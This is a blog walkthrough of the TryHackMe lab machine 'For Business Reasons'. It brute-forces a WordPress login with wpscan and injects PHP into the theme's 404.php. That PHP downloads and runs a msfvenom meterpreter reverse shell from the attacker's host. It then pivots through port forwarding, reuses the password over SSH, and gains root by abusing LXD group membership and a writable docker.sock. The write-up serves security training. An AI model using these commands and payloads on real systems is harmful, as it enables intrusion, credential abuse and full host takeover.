---
layout: default
title : m3dsec - For Business Reasons write-up
---

_**Sep 23, 2020**_

<h2 id="Overview">Overview</h2>

technique Write-up, demonstrating my approach to complete [For Business Reasons](https://tryhackme.com/room/forbusinessreasons) machine from [tryhackme](https://tryhackme.com/) created by [MsMouse](https://tryhackme.com/p/MsMouse)

<br>

<h2 id="Target-Informations">Target Informations</h2>

```
- IP ADDRESS  : 10.10.88.1
- DOMAIN NAME : MilkCo / milkco.thm
- Dificulty   : Hard
- Description : In your network scan, you found an unknown VM....
```

<br>


<h2 id="Test-Scope">Test Scope</h2>

The test scope include a given ip address `10.10.88.1` on MilkCo internal network, Our goal consist of getting 3 flags, as a proof.

<br>

<h2 id="Discovery-reconnaissance">Discovery & reconnaissance</h2>

As the first step in the Discovery phase, a network reconnaissance on the provided IP addresses to determine open ports was conducted, and The following port were identified:

```
m3dsec@local:~/forbusinessreasons.thm$ nmap -v -sC -sV -oN nmap/nmap_tcp_simple 10.10.146.229
80/tcp open   http    Apache httpd 2.4.38 ((Debian))
|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
|_http-generator: WordPress 5.4.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MilkCo Test/POC site
```

<br>

<h2 id="Port-80-compromise">Wordpress WebApp Admin panel Compromise</h2>

Enumerating The wordpress-json rest api, we can retrive the author username **sysadmin**.

```
m3dsec@local:~/forbusinessreasons.thm$ curl -s http://milkco.thm/wp-json/wp/v2/users/1|gron
json = {};
json._links = {};
json._links.collection = [];
json._links.collection[0] = {};
json._links.collection[0].href = "http:/wp-json/wp/v2/users";
json._links.self = [];
json._links.self[0] = {};
json._links.self[0].href = "http:/wp-json/wp/v2/users/1";
json.avatar_urls = {};
json.avatar_urls["24"] = "http://1.gravatar.com/avatar/7708603a80dcf700cae59574c671e047?s=24&d=mm&r=g";
json.avatar_urls["48"] = "http://1.gravatar.com/avatar/7708603a80dcf700cae59574c671e047?s=48&d=mm&r=g";
json.avatar_urls["96"] = "http://1.gravatar.com/avatar/7708603a80dcf700cae59574c671e047?s=96&d=mm&r=g";
json.description = "";
json.id = 1;
json.link = "http:/author/sysadmin/";
json.meta = [];
json.name = "sysadmin";
json.slug = "sysadmin";
json.url = "http://10.1.33.8";
```

using the wpscan tool, i attempted to bruteforce the login credentials of wordpress, and i did successfully bruteforce the sysadmin user credentials.

```
m3dsec@local:~/forbusinessreasons.thm$ wpscan --url http://milkco.thm/ -U sysadmin -P /usr/share/wordlists/rockyou.txt 
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - sysadmin / mi*******                                                                                                                                      
Trying sysadmin / kenzie Time: 00:03:17 <=-=-=                                                                    > (1665 / 14346057)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: sysadmin, Password: mi*******
```

with the retrived credentials, we can inject malicious code in WP_Theme therefor get Remote code execution on the target Host, using this aproach, 

i will be injecting a simple php code, that will help us stage our meterpreter reverse shell binary on the target host, give it the required permission, then execute it.

generate a meterpreter reverse shell linux binary, and host it.
```
m3dsec@local:~/forbusinessreasons.thm/bin$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.9.123.226 LPORT=4444 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

m3dsec@local:~/forbusinessreasons.thm/bin$ sudo python3 -m http.server 80
[sudo] password for m3dsec: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

on the wordpress panel, navigating to **Appearances** -> **Editor** -> **404.php**, we can inject this little php code.

```php
<?php
echo "[*] Check your meterpreter listener :\n";
system("curl 10.9.123.226/shell.elf --output /tmp/shell.elf");
system("chmod +x /tmp/shell.elf");
system("/tmp/shell.elf");
?>
```
clicked the button Update File, then requesting that file.

<br>

in metasploit we can see our shell popup
```
msf5 exploit(multi/handler) > set LHOST 10.9.123.226 
LHOST => 10.9.123.226
msf5 exploit(multi/handler) > set LPORT 4444 
LPORT => 4444
msf5 exploit(multi/handler) > set exitonsession false 
exitonsession => false
msf5 exploit(multi/handler) > run 

[*] Started reverse TCP handler on 10.9.123.226:4444 
[*] Sending stage (980808 bytes) to 10.10.88.1
[*] Meterpreter session 1 opened (10.9.123.226:4444 -> 10.10.88.1:45944) at 2020-09-23 17:18:57 +0100

meterpreter > getuid
Server username: no-user @ 35cebab33844 (uid=33, gid=33, euid=33, egid=33)
```

<br>

<h2 id="Internal-enumeration-Pivoting">Internal enumeration & Pivoting</h2>

once i got inside the internal network, further enumeration was required

**Network Maping**

```
meterpreter > route 

IPv4 network routes
===================

    Subnet      Netmask        Gateway     Metric  Interface
    ------      -------        -------     ------  ---------
    0.0.0.0     0.0.0.0        172.18.0.1  0       eth2
    10.0.0.0    255.255.255.0  0.0.0.0     0       eth1
    10.255.0.0  255.255.0.0    0.0.0.0     0       eth0
    172.18.0.0  255.255.0.0    0.0.0.0     0       eth2

No IPv6 routes were found.
```

first i was inside inside a docker, and there was other Subnets within the network that need further investigation

i will be using [nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) for subnets mapping.

mapping both subnets give us multiple hosts.

```
www-data@35cebab33844:/tmp$ ./nmap -sn 172.18.0.0/24 10.0.0.5/24
172.18.0.1
172.18.0.2
172.18.0.3
172.18.0.4
10.0.0.1
10.0.0.2
10.0.0.3 
10.0.0.4 
10.0.0.5 // this is where we live
10.0.0.6
```

the next step was to scan the 9 other living hosts.

```
www-data@35cebab33844:/tmp$ for i in 172.18.0.1 172.18.0.2 172.18.0.3 172.18.0.4 10.0.0.1 10.0.0.2 10.0.0.3 10.0.0.4 10.0.0.5 10.0.0.6;do nmap $i;done

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-09-23 16:01 UTC
Nmap scan report for 172.18.0.1
PORT   STATE SERVICE
22/tcp open  unknown
80/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-09-23 16:01 UTC
Nmap scan report for 172.18.0.2
PORT   STATE SERVICE
80/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 17.53 seconds
...
...
...
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-09-23 16:01 UTC
Nmap scan report for 10.0.0.6
PORT   STATE SERVICE
80/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
```

As we can see, port 22 is open on host `172.18.0.1`, we may reuse **sysadmin** password to get access.

The container include the bare minimum of commands, i had need to portforward port 22 to my local host with metasploit.

```
meterpreter > portfwd add -l 22 -p 22 -r 172.18.0.1
[*] Local TCP relay created: 0.0.0.0:22 >-> 172.18.0.1:22
meterpreter > portfwd list
0: 0.0.0.0:22 -> 172.18.0.1:22

1 total local port forwards.
meterpreter >
```

<br>

Since we tried to login into a different host with 127.0.0.1 identification, we get an error.

```
m3dsec@local:~/forbusinessreasons.thm$ ssh sysadmin@127.0.0.1
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:YWh6/YCN0RzHZZK5fdUZ2EB9I2CQSoW4XAZ5/V+CYUc.
Please contact your system administrator.
Add correct host key in /home/m3dsec/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/m3dsec/.ssh/known_hosts:9
  remove with:
  ssh-keygen -f "/home/m3dsec/.ssh/known_hosts" -R "127.0.0.1"
ECDSA host key for 127.0.0.1 has changed and you have requested strict checking.
Host key verification failed.
```

We can easily fix this problem by removing all keys belonging to that specified hostname, in our case 127.0.0.1
```
m3dsec@local:~/forbusinessreasons.thm$ ssh-keygen -f "/home/m3dsec/.ssh/known_hosts" -R "127.0.0.1"
# Host 127.0.0.1 found: line 9
/home/m3dsec/.ssh/known_hosts updated.
Original contents retained as /home/m3dsec/.ssh/known_hosts.old
```

SSH in with the same password, and get access to the 2nd subnet.
```
m3dsec@local:~/forbusinessreasons.thm$ ssh sysadmin@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:YWh6/YCN0RzHZZK5fdUZ2EB9I2CQSoW4XAZ5/V+CYUc.
Are you sure you want to continue connecting (yes/no/[fingerprint])
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
sysadmin@127.0.0.1's password: mil******
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

263 packages can be updated.
181 updates are security updates.


Last login: Sun Aug  9 15:30:13 2020 from 192.168.191.131
sysadmin@ubuntu:~$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),122(docker)
sysadmin@ubuntu:~$ cat flag1.txt 
os******
```





<br>

<h2 id="Privilege-escalation">Privilege Escalation</h2>

Once getting inside `172.18.0.1`, we start our internal enumeration and we noticed those interesting things :
- user **sysadmin** is in group **docker**
- user **sysadmin** is in group **lxd**
- the path already altred
- a cron job is running every 5 min, as root `*/5 * * * * /data/update.sh`
- **/var/run/docker.sock** is writable


<br>

at least 2 methods were tested and they successfully lead us to privilege escalation.


<br>
<h2 id="m1">Method 1 : Privilege Escalation via LXD</h2>

The user **sysadmin** is a member of lxd group
```
sysadmin@ubuntu:/tmp$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),122(docker)
```

Any members of the local lxd group on Linux systems have numerous routes to escalate their privileges to root, for a detailed explanation, you can check this [article](https://initblog.com/2019/lxd-root/).

To abuse this vulnerability, we had to create an image for lxc, Import that image, then initialize it inside a new container.


In our host, we start by building an alpine image

```
m3dsec@local:~/forbusinessreasons.thm$ git clone  https://github.com/saghul/lxd-alpine-builder.git
m3dsec@local:~/forbusinessreasons.thm$ cd lxd-alpine-builder; ./build-alpine
alpine-v3.12-x86_64-20200831_1111.tar.gz
```

Transfer the alpine tar image to the target host
```
m3dsec@local:~/forbusinessreasons.thm$ scp alpine-v3.12-x86_64-20200831_1111.tar.gz sysadmin@127.0.0.1:/tmp/alpine-v3.12-x86_64-20200831_1111.tar.gz
sysadmin@127.0.0.1's password: mi*******
alpine-v3.12-x86_64-20200831_1111.tar.gz                                                               100% 3124KB  32.9KB/s   01:34
```

on the target host, we import the image.

```
sysadmin@ubuntu:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200831_1111.tar.gz --alias m3dsec
Image imported with fingerprint: 54b31ff9784c4ae2efad2c364f2151fb7eff54e73f8c2fdf85737f00d9706977
sysadmin@ubuntu:/tmp$ lxc image list
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| m3dsec | 54b31ff9784c | no     | alpine v3.12 (20200831_11:11) | x86_64 | 3.05MB | Sep 23, 2020 at 5:03pm (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
```

run that image with security.privileged set to true
```
sysadmin@ubuntu:/tmp$ lxc init m3dsec ignite -c security.privileged=true
Creating ignite
```

mount the /root directory into the image.
```
sysadmin@ubuntu:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
```

finaly we can interact with our container and grab our flag.
```
sysadmin@ubuntu:/tmp$ lxc start ignite
sysadmin@ubuntu:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root
/mnt/root/root # cat root.txt 
Ka************3j
```



<br>

<h2 id="m1">Method 2 : Exploiting the writable Docker Socket</h2>

As we saw earlier, we have write permissions over `/var/run/docker.sock`, Therefor we can escalate our priveleges, u can read [The danger of exposing docker.sock](https://dejandayoff.com/the-danger-of-exposing-docker.sock), to get an idea of what we are exploiting here.

we will be creating a docker container that mount the root of the target host system, then use socat to execute commands into that new docker, mostly the same aproach.

<br>

lets start by listing all available docker images

```
sysadmin@ubuntu:/tmp curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
[{
    "Containers": -1,
    "Created": 1596768338,
    "Id": "sha256:d3bd49a68bba89420fc1759b197eb2dea9c8afcbb6ea1b6a59daecd1d5a0f972",
    "Labels": null,
    "ParentId": "",
    "RepoDigests": ["wordpress@sha256:efaa511f811de855bcc1a8eafc58339cbf9a315ad95f419f829025631facf6a4"],
    "RepoTags": ["wordpress:php7.2-apache"],
    "SharedSize": -1,
    "Size": 539327122,
    "VirtualSize": 539327122
}, {
    "Containers": -1,
    "Created": 1596583240,
    "Id": "sha256:718a6da099d82183c064a964523c0deca80619cb033aadd15854771fe592a480",
    "Labels": null,
    "ParentId": "",
    "RepoDigests": ["mysql@sha256:da58f943b94721d46e87d5de208dc07302a8b13e638cd1d24285d222376d6d84"],
    "RepoTags": ["mysql:5.7"],
    "SharedSize": -1,
    "Size": 448489152,
    "VirtualSize": 448489152
}]
```

then we send a JSON post request to the docker API with one of those images IDs, to create the container

```
sysadmin@ubuntu:/tmp$ curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"d3bd49a68bba89420fc1759b197eb2dea9c8afcbb6ea1b6a59daecd1d5a0f972","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
{"Id":"237cb3a25fbbcf9b4bd397e6f4ef999552b2870620c09fa0da7ee2a060be2d6e","Warnings":null}
sysadmin@ubuntu:/tmp$ curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/237cb3a25fbbcf9b4bd397e6f4ef999552b2870620c09fa0da7ee2a060be2d6e/start
```

finaly we can initiate a connection with the new container using socat
```
sysadmin@ubuntu:/tmp$ ./socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/237cb3a25fbbcf9b4bd397e6f4ef999552b2870620c09fa0da7ee2a060be2d6e/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

HTTP/1.1 101 UPGRADED
Content-Type: application/vnd.docker.raw-stream
Connection: Upgrade
Upgrade: tcp

id
uid=0(root) gid=0(root) groups=0(root)
cat /host_root/root/root.txt
Ka************3j
```
<br>
Best Regards

[m3dsec](https://twitter.com/m3dsec).

<br>
<br>

[back to main()](../../index.md)

<br>
<br>
